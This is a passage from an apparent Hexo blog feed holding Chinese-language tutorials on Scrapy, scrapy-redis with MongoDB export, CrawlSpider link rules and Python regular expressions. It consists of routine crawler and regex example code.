string">'parse_item'</span>, follow<span class="token operator">=</span>False<span class="token punctuation">)</span>, <span class="token comment" spellcheck="true">#跟进全部选择true</span>    <span class="token punctuation">)</span>    def parse_item<span class="token punctuation">(</span>self, response<span class="token punctuation">)</span>:        download_url <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='cont']//ul//a[@class='btn-b']/@href"</span><span class="token punctuation">)</span>.extract_first<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='cont']//ul//em/text()"</span><span class="token punctuation">)</span>.extract_first<span class="token punctuation">(</span><span class="token punctuation">)</span>        update_time <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='cont']//ul//span[@class='ml10']/text()"</span><span class="token punctuation">)</span>.extract_first<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># print(update_times)</span>        yield <span class="token punctuation">{</span>            <span class="token string">"download_url"</span>:download_url,            <span class="token string">"name"</span>:name,            <span class="token string">"update_time"</span>:update_time        <span class="token punctuation">}</span></code></pre><h3 id="运行爬虫"><a href="#运行爬虫" class="headerlink" title="运行爬虫"></a>运行爬虫</h3><ol><li><p>打开redis服务器</p></li><li><p>在爬虫服务器上，进入爬虫文件所在的路径，然后输入命令：</p><pre class=" language-bash"><code class="language-bash">scrapy runspider <span class="token punctuation">[</span>爬虫名<span class="token punctuation">]</span></code></pre><p>出现以下字样则表示连接成功<br><img src="https://pic.downk.cc/item/5eca3606c2a9a83be5e07288.png" alt=""></p></li><li><p>在redis数据库(通过redis-cli)中推入一个url链接:</p><pre class=" language-bash"><code class="language-bash">lpush test:start_urls 开始爬取的url</code></pre></li><li><p>通过图形化界面查看redis数据库<br><img src="https://pic.downk.cc/item/5eca4446c2a9a83be5edf7f1.png" alt=""></p></li></ol><h2 id="数据导入到mongoDB中"><a href="#数据导入到mongoDB中" class="headerlink" title="数据导入到mongoDB中"></a>数据导入到mongoDB中</h2><ol><li><p>等爬虫结束后，如果要把数据存储到mongoDB中，就应该新建一个process_items.py文件(命名任意)：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> redis<span class="token function">import</span> json<span class="token function">import</span> pymongoredis_clinet <span class="token operator">=</span> redis.Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span>,port<span class="token operator">=</span>6379,db<span class="token operator">=</span>0<span class="token punctuation">)</span>mongo_client <span class="token operator">=</span> pymongo.MongoClient<span class="token punctuation">(</span><span class="token punctuation">)</span>collection <span class="token operator">=</span> mongo_client.t2345.softInfo<span class="token keyword">while</span> True:  <span class="token comment" spellcheck="true">#实时取出数据，数据取出后redis数据库中对应数据删除</span> key,data<span class="token operator">=</span>redis_clinet.blpop<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'2345_spider:items'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#爬虫名称</span> print<span class="token punctuation">(</span>key<span class="token punctuation">)</span> d <span class="token operator">=</span> json.loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span> collection.insert_one<span class="token punctuation">(</span>d<span class="token punctuation">)</span></code></pre></li><li><p>打开mongoDB服务器</p></li><li><p>查看mongoDB数据库<br><img src="https://pic.downk.cc/item/5ecb4109c2a9a83be5f6184c.png" alt=""></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 框架使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Scrapy </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy(1)</title>
      <link href="/2020/05/15/scrapy1/"/>
      <url>/2020/05/15/scrapy1/</url>
      
        <content type="html"><![CDATA[<h2 id="Scrapy框架架构"><a href="#Scrapy框架架构" class="headerlink" title="Scrapy框架架构"></a>Scrapy框架架构</h2><h3 id="框架介绍"><a href="#框架介绍" class="headerlink" title="框架介绍"></a>框架介绍</h3><p>写一个爬虫，我们需要发送网络请求、数据分析、数据存储、反反爬虫机制(更换ip代理，设置请求头等)，异步请求等。scrapy把这些基础的东西都已经写好了，可以提高爬虫的爬取效率与开发效率。</p><h3 id="Scrapy架构图"><a href="#Scrapy架构图" class="headerlink" title="Scrapy架构图"></a>Scrapy架构图</h3><p><img src="https://pic.downk.cc/item/5ebbb9b4c2a9a83be534ce2b.png" alt=""><br><img src="https://pic.downk.cc/item/5ebbbaa5c2a9a83be535a496.png" alt=""></p><ul><li>1.spider(爬虫)给scheduler(调度器)发送请求</li><li>2.scheduler接收请求，将其存储在自己的队列中</li><li>3.引擎(engine)不断地向scheduler提取请求</li><li>4.engine将请求给downloader(下载器)，下载器到互联网上下载资源</li><li>5.engine接收到downloader返回的响应</li><li>6.engine将响应返回给spider</li><li>7.spider进行数据的分析与提取，将提取后的数据送给engine</li><li>8.engine将提取后的数据送给pipeline,指定数据存储方式</li></ul><h4 id="模块功能"><a href="#模块功能" class="headerlink" title="模块功能"></a>模块功能</h4><ol><li>Spider Engine(引擎)：Scrapy的核心部分，负责在其他模块中间通信</li><li>Spider(爬虫)：发生需要爬取的链接给引擎，最后引擎把其他模块响应的数据返回给爬虫，由爬虫对数据进行分析提取，由开发者自行决定</li><li>Scheduler(调度器)：负责接收引擎发送过来的请求，并按照一定方式排列整理，负责调度请求的顺序</li><li>Downloader(下载器)：负责接收引擎传过来的下载请求，然后去下载对应的数据再交还给引擎</li><li>Item Pipeline(管道)：负责存储爬虫传递的数据，由开发者决定数据存储位置</li><li>Downloader Middlewares(下载中间件):可以扩展下载器和引擎之间通信功能的中间件</li><li>Spider Middlewares(Spider中间件)：可以扩展爬虫和引擎之间通信功能的中间件</li></ol><h3 id="安装scrapy"><a href="#安装scrapy" class="headerlink" title="安装scrapy"></a>安装scrapy</h3><ol><li>在windows下安装scrapy，首先要保证已经安装python环境</li><li>安装anaconda</li><li>在开始的地方找到Anaconda Prompt运行，输入以下指令：<pre class=" language-bash"><code class="language-bash">conda <span class="token function">install</span> scrapy   <span class="token comment" spellcheck="true">#安装</span>scrapy   <span class="token comment" spellcheck="true">#检测是否安装成功</span></code></pre></li></ol><h3 id="创建scrapy项目"><a href="#创建scrapy项目" class="headerlink" title="创建scrapy项目"></a>创建scrapy项目</h3><p>先自己新建一个文件夹用来放scrapy项目，打开anaconda环境，即上面提及的Anaconda Prompt，使用命令行进入该文件夹。<br><img src="https://beta.gtimg.com/rdmimg/aiwx/img/ef242d8b-def6-4407-a37f-015b6cd0507a.png" alt=""></p><h4 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h4><p>使用Pycharm打开项目文件夹<br><img src="https://pic.downk.cc/item/5ebcb9d2c2a9a83be5077097.png" alt=""></p><h4 id="创建爬虫"><a href="#创建爬虫" class="headerlink" title="创建爬虫"></a>创建爬虫</h4><p>在Anaconda Prompt下进入刚刚创建的目录下，新建爬虫</p><pre class=" language-bash"><code class="language-bash">scrapy genspider 爬虫名 <span class="token string">"爬取的域名"</span>scrapy genspider xixi <span class="token string">"cr137.com"</span></code></pre><p>上述命令创建成功后会在<em>init</em>.py下多一个xixi.py,该文件是爬虫的main文件 </p><h3 id="设置settings文件"><a href="#设置settings文件" class="headerlink" title="设置settings文件"></a>设置settings文件</h3><p><img src="https://pic.downk.cc/item/5ebcbca4c2a9a83be509d264.png" alt=""><br>设置请求头，伪装身份，必要时设置DOWNLOAD_DELAY。如果要存储数据要将此文件中pipelines的注释去掉</p><h3 id="init-py文件"><a href="#init-py文件" class="headerlink" title="init.py文件"></a><strong>init</strong>.py文件</h3><p>打开新建的xixi.py文件,parse()函数是用于接收scrapy爬虫架构第6步返回的响应</p><h3 id="运行爬虫"><a href="#运行爬虫" class="headerlink" title="运行爬虫"></a>运行爬虫</h3><p>在Anaconda Prompt中执行以下命令即可执行爬虫</p><pre class=" language-bash"><code class="language-bash">scrapy crawl 爬虫名</code></pre><h4 id="查看响应类型可采用的方法"><a href="#查看响应类型可采用的方法" class="headerlink" title="查看响应类型可采用的方法"></a>查看响应类型可采用的方法</h4><p>查看响应的类型,xixi.py：</p><pre class=" language-bash"><code class="language-bash">def parse<span class="token punctuation">(</span>self,response<span class="token punctuation">)</span>:    print<span class="token punctuation">(</span><span class="token string">'='</span>*40<span class="token punctuation">)</span>    print<span class="token punctuation">(</span>type<span class="token punctuation">(</span>response<span class="token punctuation">))</span>    print<span class="token punctuation">(</span><span class="token string">'='</span>*40<span class="token punctuation">)</span></code></pre><p><img src="https://pic.downk.cc/item/5ebcd159c2a9a83be51a9e5d.png" alt=""></p><p>在xixi.py里加入以下语句：</p><pre class=" language-bash"><code class="language-bash">from scrapy.http.response.html <span class="token function">import</span> HtmlResponse</code></pre><p>查看方法的方式是鼠标选中要查看的类，按下ctrl+b(或长按ctrl用鼠标点击类名)，在上述例子中我们想查看HtmlResponse的方法，鼠标选中HtmlResponse，按下ctrl+b，得到下图<br><img src="https://pic.downk.cc/item/5ebcd330c2a9a83be51c5234.png" alt=""><br>由上图可知HtmlResponse继承自TextResponse类，继续查看TextResponse类的方法</p><h5 id="快捷执行方式"><a href="#快捷执行方式" class="headerlink" title="快捷执行方式"></a>快捷执行方式</h5><p>在爬虫项目下新建一个python文件start.py，写入以下代码：</p><pre class=" language-bash"><code class="language-bash">from scrapy <span class="token function">import</span> cmdlinecmdline.execute<span class="token punctuation">(</span><span class="token string">"scrapy crawl xixi"</span>.split<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre><p>执行此文件即可开始爬虫，就不需要再打开Anaconda Prompt</p><h2 id="CrawlSpider"><a href="#CrawlSpider" class="headerlink" title="CrawlSpider"></a>CrawlSpider</h2><p>CrawlSpider继承自Spider，只不过比Spider多了可以定义爬取的url的规则，以后scrapy碰到满足条件的url都进行爬取，而不用手动的yield Request.</p><h3 id="创建CrawlSpider爬虫"><a href="#创建CrawlSpider爬虫" class="headerlink" title="创建CrawlSpider爬虫"></a>创建CrawlSpider爬虫</h3><p>通过以下命令在Anaconda Prompt里创建CrawlSpider:</p><pre class=" language-bash"><code class="language-bash">scrapy genspider -t crawl <span class="token punctuation">[</span>爬虫名<span class="token punctuation">]</span> <span class="token punctuation">[</span>域名<span class="token punctuation">]</span></code></pre><h3 id="LinkExtractors链接提取器"><a href="#LinkExtractors链接提取器" class="headerlink" title="LinkExtractors链接提取器"></a>LinkExtractors链接提取器</h3><p>可以在所有爬的页面中找到满足规则的url，实现自动的爬取。</p><pre class=" language-bash"><code class="language-bash">class scrapy.linkextractors.LinkExtractor<span class="token punctuation">{</span>    allow <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>,    deny <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>,    allow_domains <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>,    deny_domains <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>,    restrict_xpaths <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>,    tags <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'a'</span>,<span class="token string">'area'</span><span class="token punctuation">)</span>,    attrs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span>,    canonicalize <span class="token operator">=</span> True,    unique <span class="token operator">=</span> True,    process_value <span class="token operator">=</span> None<span class="token punctuation">}</span></code></pre><p>主要参数：</p><ul><li>allow:允许的url,所有满足这个正则表达式的url都会被提取。</li><li>deny:禁止的url，所有满足这个正则表达式的url都不会被提取</li><li>allow_domain:允许的域名，只有在这个里面指定的域名的url才会被提取</li><li>deny_domain:禁止的域名，所有在这个里面指定的域名的url都不会被提取</li><li>restrict_xpaths:严格的xpaths，和allow共同的过滤链接</li></ul><h3 id="Rule规则类"><a href="#Rule规则类" class="headerlink" title="Rule规则类"></a>Rule规则类</h3><p>定义爬虫的规则类：</p><pre class=" language-bash"><code class="language-bash">class scrapy.spider.Rule<span class="token punctuation">{</span>    link_extractors,    callback <span class="token operator">=</span> None,    cb_kwargs <span class="token operator">=</span> None,    follow <span class="token operator">=</span> None,    process_links <span class="token operator">=</span> None,    process_request <span class="token operator">=</span> None<span class="token punctuation">}</span></code></pre><p>主要参数：</p><ul><li>link_extractor:一个LinkExtractor对象，用于定义爬取规则。</li><li>callback:满足这个规则的Url,应该执行哪个回调函数。因为CrawlSpider使用了parse作为回调函数，因此不要覆盖parse作为回调函数自己的回调函数</li><li>follow:指定根据该规则从response提取的链接是否需要跟进</li><li>process_links:从link_extractor中获取到链接后会传递给这个函数，用来过滤不需要爬取的链接。</li></ul><h3 id="CrawlSpider实战"><a href="#CrawlSpider实战" class="headerlink" title="CrawlSpider实战"></a>CrawlSpider实战</h3><p>创建CrawlSpider项目，在项目下创建爬虫文件wxapp.py，打开微信小程序社区的教程部分，找规律</p><ol><li><p>点击不同的页数的页面，观察url变化<br><img src="https://pic.downk.cc/item/5ebcf9b5c2a9a83be53fca44.png" alt=""><br><img src="https://pic.downk.cc/item/5ebcf9d7c2a9a83be53fe72d.png" alt=""><br>发现只有page参数变化</p></li><li><p>点击不同的文章进行查看<br><img src="https://pic.downk.cc/item/5ebcfabac2a9a83be540c043.png" alt=""><br><img src="https://pic.downk.cc/item/5ebcfb00c2a9a83be5410c2f.png" alt=""></p></li></ol><h4 id="配置准备"><a href="#配置准备" class="headerlink" title="配置准备"></a>配置准备</h4><p>设置setting文件，新建文件start.py执行爬虫，运行即可</p><h4 id="页面爬取"><a href="#页面爬取" class="headerlink" title="页面爬取"></a>页面爬取</h4><p>在wxapp.py文件里修改rules，对爬取信息进行筛选，如上面的url爬取。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token function">import</span> scrapyfrom scrapy.linkextractors <span class="token function">import</span> LinkExtractorfrom scrapy.spiders <span class="token function">import</span> CrawlSpider, Ruleclass WxSpider<span class="token punctuation">(</span>CrawlSpider<span class="token punctuation">)</span>:    name <span class="token operator">=</span> <span class="token string">'wx'</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'wxapp-union.com'</span><span class="token punctuation">]</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'http://www.wxapp-union.com/portal.php?mod=list&amp;catid=2&amp;page=1'</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#翻页</span>    rules <span class="token operator">=</span> <span class="token punctuation">(</span>        Rule<span class="token punctuation">(</span>LinkExtractor<span class="token punctuation">(</span>allow<span class="token operator">=</span>r<span class="token string">'.+mod=list&amp;catid=2&amp;page=\d'</span><span class="token punctuation">)</span>,              follow<span class="token operator">=</span>True<span class="token punctuation">)</span>,    <span class="token comment" spellcheck="true">#此处不需要指定回调，自动爬取即可</span>        <span class="token comment" spellcheck="true">#进一步解析相同域名，即进一步爬取每篇文章的详细内容</span>    <span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#点击查看具体页面</span>        Rule<span class="token punctuation">(</span>LinkExtractor<span class="token punctuation">(</span>allow<span class="token operator">=</span>r<span class="token string">'.+article-.+\.html'</span><span class="token punctuation">)</span>,            callback<span class="token operator">=</span><span class="token string">"parse_item"</span>,follow<span class="token operator">=</span>False<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#不需要跟进，不用再继续解析</span>    def parse_item<span class="token punctuation">(</span>self, response<span class="token punctuation">)</span>:        title <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//h1[@class='ph']/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>        print<span class="token punctuation">(</span>title<span class="token punctuation">)</span></code></pre><h4 id="提取作者时间"><a href="#提取作者时间" class="headerlink" title="提取作者时间"></a>提取作者时间</h4><p><img src="https://pic.downk.cc/item/5ebdf96fc2a9a83be53c8c0e.png" alt=""></p><p>wx.py:</p><pre class=" language-bash"><code class="language-bash"> def parse_item<span class="token punctuation">(</span>self, response<span class="token punctuation">)</span>:        author_p <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">".//p[@class='authors']"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回响应这个对象，类型为object</span>        author <span class="token operator">=</span> author_p.xpath<span class="token punctuation">(</span><span class="token string">".//a/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#get()返回响应内容，类型为字符串  .//表示在当前环境</span>        <span class="token function">time</span> <span class="token operator">=</span> author_p.xpath<span class="token punctuation">(</span><span class="token string">".//span/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>        print<span class="token punctuation">(</span><span class="token string">"author:%s / time:%s"</span> % <span class="token punctuation">(</span>author,time<span class="token punctuation">))</span>        print<span class="token punctuation">(</span><span class="token string">"="</span>*40<span class="token punctuation">)</span></code></pre><h4 id="提取前言部分"><a href="#提取前言部分" class="headerlink" title="提取前言部分"></a>提取前言部分</h4><p><img src="https://pic.downk.cc/item/5ebdff87c2a9a83be541eebd.png" alt=""><br>wx.py</p><pre class=" language-bash"><code class="language-bash"> def parse_item<span class="token punctuation">(</span>self, response<span class="token punctuation">)</span>:        text_p <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='blockquote']"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> text_p.xpath<span class="token punctuation">(</span><span class="token string">".//p/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>        print<span class="token punctuation">(</span>text<span class="token punctuation">)</span>        print<span class="token punctuation">(</span><span class="token string">"="</span>*40<span class="token punctuation">)</span></code></pre><h4 id="存储以上提取的所有信息"><a href="#存储以上提取的所有信息" class="headerlink" title="存储以上提取的所有信息"></a>存储以上提取的所有信息</h4><p>items.py</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#用来描述自定义数据包含哪些字段信息</span>class WxappItem<span class="token punctuation">(</span>scrapy.Item<span class="token punctuation">)</span>:    title <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    author <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">time</span> <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    text <span class="token operator">=</span> scrapy.Field<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>pipeline.py</p><pre class=" language-bash"><code class="language-bash">from scrapy.exporters <span class="token function">import</span> JsonLinesItemExporter  <span class="token comment" spellcheck="true">#JsonLinesExporter将数据直接存到硬盘中，而不需要存在内存中</span>class WxappPipeline<span class="token punctuation">(</span>object<span class="token punctuation">)</span>:    def __init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        self.fp <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"wx.json"</span>,<span class="token string">'wb'</span><span class="token punctuation">)</span>        self.exporter <span class="token operator">=</span> JsonLinesItemExporter<span class="token punctuation">(</span>self.fp,ensure_ascii<span class="token operator">=</span>False,encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    def process_item<span class="token punctuation">(</span>self, item, spider<span class="token punctuation">)</span>:        self.exporter.export_item<span class="token punctuation">(</span>item<span class="token punctuation">)</span>        <span class="token keyword">return</span> item    <span class="token comment" spellcheck="true">#关闭爬虫</span>    def close_spider<span class="token punctuation">(</span>self,spider<span class="token punctuation">)</span>:        self.fp.close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>wx.py</p><pre class=" language-bash"><code class="language-bash"> def parse_item<span class="token punctuation">(</span>self, response<span class="token punctuation">)</span>:        title <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//h1[@class='ph']/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>        author_p <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">".//p[@class='authors']"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 返回响应这个对象，类型为object</span>        author <span class="token operator">=</span> author_p.xpath<span class="token punctuation">(</span><span class="token string">".//a/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># get()返回响应内容，类型为字符串</span>        <span class="token function">time</span> <span class="token operator">=</span> author_p.xpath<span class="token punctuation">(</span><span class="token string">".//span/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>        text_p <span class="token operator">=</span> response.xpath<span class="token punctuation">(</span><span class="token string">"//div[@class='blockquote']"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> text_p.xpath<span class="token punctuation">(</span><span class="token string">".//p/text()"</span><span class="token punctuation">)</span>.get<span class="token punctuation">(</span><span class="token punctuation">)</span>        item <span class="token operator">=</span> WxappItem<span class="token punctuation">(</span>title<span class="token operator">=</span>title,author<span class="token operator">=</span>author,time<span class="token operator">=</span>time,text<span class="token operator">=</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> item</code></pre><h4 id="在同等文件夹下创建新文件"><a href="#在同等文件夹下创建新文件" class="headerlink" title="在同等文件夹下创建新文件"></a>在同等文件夹下创建新文件</h4><p>os_path.py</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> ospath <span class="token operator">=</span> os.path.join<span class="token punctuation">(</span>os.path.dirname<span class="token punctuation">(</span>os.path.dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">))</span>,<span class="token string">'文件夹名'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#在该文件的相同文件夹下新建一个文件 os.path.dirname表示上一级目录</span><span class="token keyword">if</span> not os.path.exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span>:    os.mkdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>else:    print<span class="token punctuation">(</span><span class="token string">"文件夹存在"</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 框架使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络爬虫(1)s</title>
      <link href="/2020/04/20/spider1/"/>
      <url>/2020/04/20/spider1/</url>
      
        <content type="html"><![CDATA[<h2 id="网络爬虫"><a href="#网络爬虫" class="headerlink" title="网络爬虫"></a>网络爬虫</h2><p>爬虫是一个模拟人类请求网站的行为的程序，可以自动请求网页，并将数据抓取下来，然后使用一定规则提取有价值的数据。(摘自百度百科)</p><h3 id="通用爬虫和聚焦爬虫"><a href="#通用爬虫和聚焦爬虫" class="headerlink" title="通用爬虫和聚焦爬虫"></a>通用爬虫和聚焦爬虫</h3><ul><li>通用爬虫：是搜索引擎抓取系统的重要组成部分，主要是将网页下载到本地，形成一个互联网内容的备份</li><li>聚焦爬虫：是面向特定需求的一种网络爬虫程序，与通用爬虫的区别在于，聚焦爬虫在实施网页抓取的同时会对内容进行筛选和处理，尽量保证只抓取与需求相关的网页信息。</li></ul><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符，及这些特定字符的组合，组成一个规则字符串，这个规则字符串用来表达对字符串的一种过滤逻辑.</p><h3 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h3><p>re模块是专门用来实现正则表达式的模块</p><h3 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a>正则表达式函数</h3><ul><li>search 若匹配，输出匹配字符的索引位置并输出匹配字符(match)</li><li>findall 若匹配，输出匹配字符</li><li>match 从头开始匹配</li><li>全局匹配 re.compile(正则表达式).findall(字符串)</li></ul><pre class=" language-bash"><code class="language-bash">re.search<span class="token punctuation">(</span><span class="token string">"p.*y"</span>,<span class="token string">"poyphuiy"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出第一个满足此正则表达式的子串 poy</span>re.compile<span class="token punctuation">(</span><span class="token string">"p.*y"</span><span class="token punctuation">)</span>.findall<span class="token punctuation">(</span><span class="token string">"poyphuiy"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出所有满足正则表达式的子串 poy phuiy</span></code></pre><h3 id="原子"><a href="#原子" class="headerlink" title="原子"></a>原子</h3><p>原子是正则表达式中最基本的组成单位，每个正则表达式中至少要包含一个原子，常见的原子类型有：</p><ul><li>普通字符作为原子</li><li>非打印字符作为原子</li><li>通用字符作为原子</li><li>原子</li></ul><h4 id="普通字符作为原子"><a href="#普通字符作为原子" class="headerlink" title="普通字符作为原子"></a>普通字符作为原子</h4><pre class=" language-bash"><code class="language-bash">re.search<span class="token punctuation">(</span><span class="token string">"and"</span>,<span class="token string">"you and me"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#match and</span></code></pre><h4 id="非打印字符作为原子"><a href="#非打印字符作为原子" class="headerlink" title="非打印字符作为原子"></a>非打印字符作为原子</h4><p>\n 换行符 \t制表符</p><pre class=" language-bash"><code class="language-bash">re.search<span class="token punctuation">(</span><span class="token string">"\n"</span>,<span class="token string">"hello    world"</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#match \n</span></code></pre><h4 id="通用字符作为原子"><a href="#通用字符作为原子" class="headerlink" title="通用字符作为原子"></a>通用字符作为原子</h4><ul><li>\w 匹配字母、数字、下划线</li><li>\W 除字母、数字、下划线</li><li>\d 十进制数字</li><li>\D 除十进制数字</li><li>\s 空白字符</li><li>\S 除空白字符<pre class=" language-bash"><code class="language-bash">re.search<span class="token punctuation">(</span><span class="token string">"\d\d"</span>,<span class="token string">"hello17world"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#match 17</span>re.search<span class="token punctuation">(</span><span class="token string">"\d\d\w"</span>,<span class="token string">"hello17world"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#match 17w</span></code></pre></li></ul><h4 id="原子表作为原子"><a href="#原子表作为原子" class="headerlink" title="原子表作为原子"></a>原子表作为原子</h4><p>从原子表中选一个字符进行匹配</p><pre class=" language-bash"><code class="language-bash">re.search<span class="token punctuation">(</span><span class="token string">"hel[jkl]o"</span>,<span class="token string">"hello17world"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#match hello</span>re.search<span class="token punctuation">(</span><span class="token string">"hel[lo]"</span>,<span class="token string">"hello17world"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#match hell</span></code></pre><h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><ul><li>. 除换行外任意一个字符</li><li>^ 开始字符</li><li>$ 结束位置</li><li><ul><li>0/1/多次</li></ul></li><li>? 0/1次</li><li><ul><li>1/多次</li></ul></li></ul><h4 id="单个字符匹配"><a href="#单个字符匹配" class="headerlink" title="单个字符匹配"></a>单个字符匹配</h4><p><font color="#fb8c00">. 点</font> 匹配单个任意字符</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> rere.findall<span class="token punctuation">(</span><span class="token string">".ood"</span>,<span class="token string">"I say good and food"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出为good food</span></code></pre><p><font color="#fb8c00">[]</font> 中括号中的内容会被逐一匹配</p><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"[gf]ood"</span>,<span class="token string">"I say good and food"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出为good food</span></code></pre><p><font color="#fb8c00">\d</font> 匹配单个数字</p><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"\d"</span>,<span class="token string">"I am 40"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出为4 0</span>re.findall<span class="token punctuation">(</span><span class="token string">"\d\d"</span>,<span class="token string">"I am 40"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出为40</span></code></pre><p><font color="#fb8c00">\w</font> 匹配的是0-9，a-z,A-Z，_ 的单个字符</p><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"\w"</span>,<span class="token string">"a b!1_"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出为a b 1 _</span></code></pre><p><font color="#fb8c00">\s</font> 匹配空白字符，包含tab键</p><h4 id="匹配一组字符"><a href="#匹配一组字符" class="headerlink" title="匹配一组字符"></a>匹配一组字符</h4><ul><li><p>直接匹配</p><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"good"</span>,<span class="token string">"I say good and food"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出为good</span></code></pre></li><li><p>使用分隔符，匹配两个不同的字符串</p><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"good|food"</span>,<span class="token string">"I say good and food"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#输出为good food</span></code></pre></li><li><p><font color="#fb8c00"> * </font>号 匹配左邻字符出现0次或多次</p><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"go*gle"</span>,<span class="token string">"I like google not ggle goooogle and gogle"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#*左邻为o,即o出现0次或多次，输出为 google ggle goooogle gogle</span></code></pre></li><li><p><font color="#fb8c00">+ </font>号 匹配左邻字符出现一次或多次</p><pre 